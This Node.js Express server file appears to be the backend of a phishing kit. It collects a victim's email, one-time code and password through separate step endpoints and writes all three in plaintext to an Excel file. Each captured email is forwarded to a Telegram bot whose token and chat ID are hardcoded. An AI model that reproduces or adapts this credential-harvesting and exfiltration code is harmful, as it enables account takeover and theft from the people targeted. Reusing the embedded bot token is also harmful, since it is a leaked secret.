const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const cors = require("cors");
const XLSX = require("xlsx");
const axios = require("axios");

const TELEGRAM_BOT_TOKEN = '7812599837:AAH9xT2MoxW42PLeb3SkdS7DyNsrngV6JKo';
const TELEGRAM_CHAT_ID = '6990985746';

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.static(__dirname));
app.use(bodyParser.json());

const filePath = path.join(__dirname, "data.xlsx");
let allData = [];

function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
  }).then(() => {
    console.log("✅ Telegram message sent!");
  }).catch(err => {
    console.error("❌ Telegram error:", err.message);
  });
}

const logAndSave = (data) => {
  allData.push(data);
  const worksheet = XLSX.utils.json_to_sheet(allData);
  const workbook = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(workbook, worksheet, "Sheet1");
  XLSX.writeFile(workbook, filePath);
};

// 📩 Step 1: Email — goes to Telegram
app.post("/step-email", (req, res) => {
  const email = req.body.email;
  logAndSave({ email });
  sendTelegramMessage(`🟢 New Email: ${email}`);
  res.sendStatus(200);
});

// 🔢 Step 2: Code — only in Render
app.post("/step-code", (req, res) => {
  const code = req.body.code;
  console.log("Code:", code);
  logAndSave({ code });
  res.sendStatus(200);
});

// 🔐 Step 3: Password — only in Render
app.post("/step-password", (req, res) => {
  const password = req.body.password;
  console.log("Password:", password);
  logAndSave({ password });
  res.sendStatus(200);
});

// ✅ Final Registration (optional)
app.post("/register", (req, res) => {
  const { email, code, password } = req.body;
  logAndSave({ email, code, password });
  res.json({ status: "User registration completed." });
});

// 🌐 Start server
app.listen(port, () => {
  console.log(`🚀 Server running on http://localhost:${port}`);
});
